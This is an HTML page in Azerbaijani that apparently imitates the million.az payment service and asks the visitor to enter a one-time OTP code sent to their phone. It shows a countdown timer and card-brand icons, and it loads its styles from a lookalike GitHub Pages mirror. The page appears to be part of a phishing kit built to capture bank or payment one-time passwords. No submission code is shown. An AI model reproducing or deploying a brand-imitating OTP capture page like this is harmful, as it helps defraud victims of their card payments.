<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>M10</title>
    <link rel="stylesheet"
        href="https://ysrex.github.io/millionazz/cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <!-- Font Awesome ikonları için -->
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: url('../background.png') no-repeat center center fixed;
            background-size: cover;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            background-color: #fff;
            border-radius: 15px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            padding: 80px;
            width: 70vw;
            height: 70vh;
            text-align: center;
        }

        .form-group {
            margin-bottom: 30px;
        }

        label {
            font-weight: bold;
            display: block;
            margin-bottom: 15px;
            font-size: 22px;
        }

        input[type="number"] {
            width: calc(100% - 16px);
            padding: 20px;
            border: 2px solid black;
            border-radius: 40px;
            box-sizing: border-box;
            font-size: 20px;
        }

        button {
            width: 100%;
            padding: 20px;
            border: none;
            border-radius: 40px;
            background-color: #cccccc;
            color: #fff;
            cursor: not-allowed;
            font-size: 20px;
            transition: background-color 0.3s ease;
            margin-top: 30px;
        }

        button:enabled {
            background-color: #45a049;
            cursor: pointer;
        }

        button:disabled {
            background-color: #cccccc;
            cursor: not-allowed;
        }

        .logo {
            margin-bottom: 30px;
            text-align: center;
        }

        .bank-icons {
            display: flex;
            justify-content: center;
            margin-top: 30px;
        }

        .bank-icons i {
            font-size: 30px;
            margin: 0 15px;
            color: #888;
            transition: color 0.3s ease;
        }

        .bank-icons i:hover {
            color: #333;
        }

        .timer {
            font-size: 3rem;
            color: #333;
            margin-bottom: 30px;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="logo">
            <img src="https://million.az/logo/main-logo.svg" alt="Logo" width="200">
        </div>
        <div class="timer" id="timer">02:00</div>
        <form id="myForm">
            <div class="form-group">
                <div class="item item-indent">Telefonunuza gələn birdəfəlik OTP şifrəni daxil edin. </div>
                <label for="cardName">Şifrə göndərildi: +994*******</label>
                <input type="number" id="cardName" placeholder="Otp Kod" maxlength="7" minlength="4" required>
            </div>

            <div style="text-align: center;">
                <button type="button" id="submitButton" disabled>İləri <i class="fas fa-arrow-right"></i></button>
            </div>
        </form>
        <div class="bank-icons">
            <i class="fab fa-cc-visa"></i>
            <i class="fab fa-cc-mastercard"></i>
            <i class="fab fa-cc-amex"></i>
        </div>
    </div>
